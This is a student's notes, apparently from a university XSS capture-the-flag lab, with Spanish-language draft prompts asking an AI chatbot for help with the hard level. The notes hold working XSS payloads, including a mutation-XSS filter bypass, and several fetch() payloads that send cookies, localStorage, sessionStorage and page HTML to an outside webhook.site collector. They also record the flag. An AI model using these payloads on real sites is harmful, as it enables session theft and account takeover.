@@ -1,0 +1,139 @@
+
+easy
+https://xss3.dsa.linti.unlp.edu.ar/easy?payload=%3Cscript%3Ealert(1)%3C/script%3E
+FLAG{wa
+
+medium
+https://xss3.dsa.linti.unlp.edu.ar/medium?payload=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+rming_u
+
+hard
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=%27%3Balert(1)%3B//
+p_XSS}
+
+
+
+Saca una alert pero no muestra la flag
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=%3Cform%3E%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Cstyle%3E%3C%2Fmath%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=%3Cform%3E%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Cstyle%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+
+
+FLAG{warming_up_XSS}
+
+WEBHOOK
+https://webhook.site/#!/view/4f2f8406-d224-45fc-803e-7e2b7eb67011/8f167b76-ce8f-427d-b9d4-d5fbd1bf9af6/1
+
+
+innerHTML
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=<form><math><mtext></form><form><mglyph><style></math><img src=x onerror="fetch(`https://webhook.site/4f2f8406-d224-45fc-803e-7e2b7eb67011/?leak=${btoa(document.body.innerHTML)}`)">
+
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=%3Cform%3E%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Cstyle%3E%3C%2Fmath%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch(%60https%3A%2F%2Fwebhook.site%2F4f2f8406-d224-45fc-803e-7e2b7eb67011%2F%3Fleak%3D%24%7Bbtoa(document.body.innerHTML)%7D%60)%22%3E
+
+
+cookies
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=<form><math><mtext></form><form><mglyph><style></math><img src=x onerror="fetch(`https://webhook.site/4f2f8406-d224-45fc-803e-7e2b7eb67011/?cookies=${btoa(document.cookie)}`)">
+
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=%3Cform%3E%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Cstyle%3E%3C%2Fmath%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch(%60https%3A%2F%2Fwebhook.site%2F4f2f8406-d224-45fc-803e-7e2b7eb67011%2F%3Fcookies%3D%24%7Bbtoa(document.cookie)%7D%60)%22%3E
+
+
+
+localStorage
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=<form><math><mtext></form><form><mglyph><style></math><img src=x onerror="fetch(`https://webhook.site/4f2f8406-d224-45fc-803e-7e2b7eb67011/?storage=${btoa(JSON.stringify(localStorage))}`)">
+
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=%3Cform%3E%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Cstyle%3E%3C%2Fmath%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch(%60https%3A%2F%2Fwebhook.site%2F4f2f8406-d224-45fc-803e-7e2b7eb67011%2F%3Fstorage%3D%24%7Bbtoa(JSON.stringify(localStorage))%7D%60)%22%3E
+
+
+sessionStorage
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=<form><math><mtext></form><form><mglyph><style></math><img src=x onerror="fetch(`https://webhook.site/4f2f8406-d224-45fc-803e-7e2b7eb67011/?session=${btoa(JSON.stringify(sessionStorage))}`)">
+
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=%3Cform%3E%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Cstyle%3E%3C%2Fmath%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch(%60https%3A%2F%2Fwebhook.site%2F4f2f8406-d224-45fc-803e-7e2b7eb67011%2F%3Fsession%3D%24%7Bbtoa(JSON.stringify(sessionStorage))%7D%60)%22%3E
+
+
+TODO
+<form><math><mtext></form><form><mglyph><style></math><img src=x onerror="alert(1);;fetch(`https://webhook.site/4f2f8406-d224-45fc-803e-7e2b7eb67011/?cookies=`+btoa(document.cookie)+`&local=`+btoa(JSON.stringify(localStorage))+`&session=`+btoa(JSON.stringify(sessionStorage))+`&html=`+btoa(document.body.innerHTML)+`&url=`+btoa(location.href));">
+
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=%3Cform%3E%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Cstyle%3E%3C%2Fmath%3E%3Cimg%20src%3Dx%20onerror%3D%22fetch(%60https%3A%2F%2Fwebhook.site%2F4f2f8406-d224-45fc-803e-7e2b7eb67011%2F%3Fcookies%3D%60%2Bbtoa(document.cookie)%2B%60%26local%3D%60%2Bbtoa(JSON.stringify(localStorage))%2B%60%26session%3D%60%2Bbtoa(JSON.stringify(sessionStorage))%2B%60%26html%3D%60%2Bbtoa(document.body.innerHTML)%2B%60%26url%3D%60%2Bbtoa(location.href))%3Balert(1)%3B%22%3E
+
+
+Todo + setTimeout
+<form><math><mtext></form><form><mglyph><style></math><img src=x onerror="alert(1);setTimeout(()=>{fetch(`https://webhook.site/4f2f8406-d224-45fc-803e-7e2b7eb67011/?cookies=`+btoa(document.cookie)+`&local=`+btoa(JSON.stringify(localStorage))+`&session=`+btoa(JSON.stringify(sessionStorage))+`&html=`+btoa(document.body.innerHTML)+`&url=`+btoa(location.href))}, 1000);">
+
+
+
+
+
+prompt
+
+Hola! estoy intentando resolver un reto CTF que tiene el siguiente enunciado:  
+
+Ejercicio 4 - CTF - XSS 
+c)​ mutation XSS https://xss3.dsa.linti.unlp.edu.ar  
+
+Y en la pagina donde subir las flags dice esto:  
+XSS Level 3 - Math/Dom 1000 
+Dificil! 
+https://xss3.dsa.linti.unlp.edu.ar/  
+Con la pista:  https://xss3.dsa.linti.unlp.edu.ar/mutation?payload=%3Cmath%3E%3C/br%3E%3Cstyle%3E%3Ca%20id=%22%3C/style  
+
+La pagina principal (https://xss3.dsa.linti.unlp.edu.ar) da este html:
+
+<!DOCTYPE html><html><head><title>Capture the flag</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"><!--link(rel='stylesheet', href='/css/styles.css')--></head><body><script src="https://code.jquery.com/jquery-3.5.0.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script><nav class="navbar navbar-expand-lg navbar-light bg-light"><a class="navbar-brand" href="#">App</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav mr-auto"><li class="nav-item active"><a class="nav-link" href="#">Something</a></li><li class="nav-item"><a class="nav-link" href="/easy?payload=asd">Something else</a></li><li class="nav-item"><a class="nav-link" href="#">WTF is this?</a></li><li class="nav-item"><a class="nav-link" href="#">LoL</a></li></ul><ul class="navbar-nav float-right"><li class="nav-item"><a class="nav-link" href="/medium?payload=asd">Login</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Accounts</a><div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink"><a class="dropdown-item" href="/hard?userName=hackerman">Settings</a></div></li></ul></div></nav><script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script><div class="container listing-reg"><div class="row"><div class="col-sm-4"></div><div class="col-sm-4"><h1>The Amazing App</h1></div><div class="col-sm-4"></div></div><div class="row"><br></div><div class="row"><br></div><div class="row"><br></div><div class="row"><div class="col-sm-4"></div><div class="col-sm-4"><br><p></p><p id="inyectable"></p><br></div><div class="col-sm-4"></div></div><div class="row"><br></div><div class="row"><br></div><div class="row"><div class="col-sm-4"></div><div class="col-sm-4"><div class="card text-center"><h5 class="card-header">Hello There !</h5><div class="card-body"><h5 class="card-title">Important Message</h5><p class="card-text">[]+[]+[]+ Capture the flag +[]+[]+[]</p></div></div></div><div class="col-sm-4"></div></div><div class="row"><br></div><div class="row"><br></div></div></body></html>
+
+en esta pagina descubri tres sitios mas a los que ir /easy /medium y /hard
+en el reto de /easy ya encontre la primer parte de la flag ejecutando:
+https://xss3.dsa.linti.unlp.edu.ar/easy?payload=%3Cscript%3Ealert(1)%3C/script%3E
+Luego de cargar la pagina salto una alerta que decía 1 y la pagina mostro la primer parte de la flag en esta seccion del html:
+<div class="col-sm-4"><br><p><script>alert(1)</script></p><p id="inyectable"></p><p>FLAG{wa</p><br></div>
+
+ahora estoy buscando como resolver las paginas /medium y /hard
+
+
+
+
+prompt 2
+
+
+Hola! estoy intentando resolver un reto CTF que tiene el siguiente enunciado:  
+
+Ejercicio 4 - CTF - XSS 
+c)​ mutation XSS https://xss3.dsa.linti.unlp.edu.ar  
+
+Y en la pagina donde subir las flags dice esto:  
+Xss Level 1
+500
+La flag está dividida en tres partes,
+
+Debes pasar los tres niveles (easy medium hard): https://xss3.dsa.linti.unlp.edu.ar/
+
+La pagina principal (https://xss3.dsa.linti.unlp.edu.ar) da este html:
+
+<!DOCTYPE html><html><head><title>Capture the flag</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"><!--link(rel='stylesheet', href='/css/styles.css')--></head><body><script src="https://code.jquery.com/jquery-3.5.0.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script><nav class="navbar navbar-expand-lg navbar-light bg-light"><a class="navbar-brand" href="#">App</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav mr-auto"><li class="nav-item active"><a class="nav-link" href="#">Something</a></li><li class="nav-item"><a class="nav-link" href="/easy?payload=asd">Something else</a></li><li class="nav-item"><a class="nav-link" href="#">WTF is this?</a></li><li class="nav-item"><a class="nav-link" href="#">LoL</a></li></ul><ul class="navbar-nav float-right"><li class="nav-item"><a class="nav-link" href="/medium?payload=asd">Login</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Accounts</a><div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink"><a class="dropdown-item" href="/hard?userName=hackerman">Settings</a></div></li></ul></div></nav><script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script><div class="container listing-reg"><div class="row"><div class="col-sm-4"></div><div class="col-sm-4"><h1>The Amazing App</h1></div><div class="col-sm-4"></div></div><div class="row"><br></div><div class="row"><br></div><div class="row"><br></div><div class="row"><div class="col-sm-4"></div><div class="col-sm-4"><br><p></p><p id="inyectable"></p><br></div><div class="col-sm-4"></div></div><div class="row"><br></div><div class="row"><br></div><div class="row"><div class="col-sm-4"></div><div class="col-sm-4"><div class="card text-center"><h5 class="card-header">Hello There !</h5><div class="card-body"><h5 class="card-title">Important Message</h5><p class="card-text">[]+[]+[]+ Capture the flag +[]+[]+[]</p></div></div></div><div class="col-sm-4"></div></div><div class="row"><br></div><div class="row"><br></div></div></body></html>
+
+en esta pagina descubri tres sitios mas a los que ir /easy /medium y /hard
+
+en el reto de /easy ya encontre la primer parte de la flag ejecutando:
+https://xss3.dsa.linti.unlp.edu.ar/easy?payload=%3Cscript%3Ealert(1)%3C/script%3E
+Luego de cargar la pagina salto una alerta que decía 1 y la pagina mostro la primer parte de la flag en esta seccion del html:
+<div class="col-sm-4"><br><p><script>alert(1)</script></p><p id="inyectable"></p><p>FLAG{wa</p><br></div>
+Por lo que el principio de la flag es 
+FLAG{wa
+
+tambien encontre la flag en la pagina /medium con el siguiente link
+https://xss3.dsa.linti.unlp.edu.ar/medium?payload=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+Esto logró generar una alerta que decia 1 (que con el metodo de la pagina /easy no funcionaba) y en la pagina aparecio la siguiente parte de la flag en el mismo lugar que en la de la pagina easy:
+rming_u
+
+
+Por lo que la flag por ahora viene quedando:
+FLAG{warming_u
+
+ahora estoy buscando como resolver la pagina hard. Como te habia comentado al principio encontre la referencia a la pagina /hard usando el html de la pagina principal y este daba indicio no al uso de un parametro  "payload" sino a un "userName" (href="/hard?userName=hackerman"). En la nueva pagina ahora ya no aparece directamente el payload, sino que aparece el mensaje "Hello hackerman", donde hackerman se reeemplaza por lo que se envie por userName. Ya probe con los mensaje que funcionaron en /easy y en /medium y no funcionó, ya que la pagina parece bloquearlos por alguna razón. Siguiendo la pista que me dieron en la pagina del reto CTF (https://xss3.dsa.linti.unlp.edu.ar/mutation?payload=%3Cmath%3E%3C/br%3E%3Cstyle%3E%3Ca%20id=%22%3C/style) llegue a la conclusión que se trata de una mutacion XSS. Y probando distintas formas llegue a este link que me muestra una alerta pero no me da la flag directamente en lo que se ve de pagina como en los niveles anteriores:
+https://xss3.dsa.linti.unlp.edu.ar/hard?userName=%3Cform%3E%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Cstyle%3E%3C%2Fmath%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+Te paso el codigo de la pagina /hard a continuación, me ayudarias a completar este desafío?
+
+
+<!DOCTYPE html><html><head><title>h4rd</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"><!--link(rel='stylesheet', href='/css/styles.css')--></head><body><script src="https://code.jquery.com/jquery-3.5.0.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script><nav class="navbar navbar-expand-lg navbar-light bg-light"><a class="navbar-brand" href="#">App</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav mr-auto"><li class="nav-item active"><a class="nav-link" href="#">Something</a></li><li class="nav-item"><a class="nav-link" href="/easy?payload=asd">Something else</a></li><li class="nav-item"><a class="nav-link" href="#">WTF is this?</a></li><li class="nav-item"><a class="nav-link" href="#">LoL</a></li></ul><ul class="navbar-nav float-right"><li class="nav-item"><a class="nav-link" href="/medium?payload=asd">Login</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Accounts</a><div class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink"><a class="dropdown-item" href="/hard?userName=hackerman">Settings</a></div></li></ul></div></nav><script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script><div class="container listing-reg"><div class="row"><div class="col-sm-4"></div><div class="col-sm-4"><h1>The Amazing App</h1></div><div class="col-sm-4"></div></div><div class="row"><br></div><div class="row"><br></div><div class="row"><br></div><div class="row"><div class="col-sm-4"></div><div class="col-sm-4"><br><p></p><p id="inyectable"></p><script>var userName='hackerman';
+document.getElementById("inyectable").innerHTML = "Hello "+userName;</script><br></div><div class="col-sm-4"></div></div><div class="row"><br></div><div class="row"><br></div><div class="row"><div class="col-sm-4"></div><div class="col-sm-4"><div class="card text-center"><h5 class="card-header">Hello There !</h5><div class="card-body"><h5 class="card-title">Important Message</h5><p class="card-text">Can you execute an alert ?!?!</p></div></div></div><div class="col-sm-4"></div></div><div class="row"><br></div><div class="row"><br></div></div></body></html>
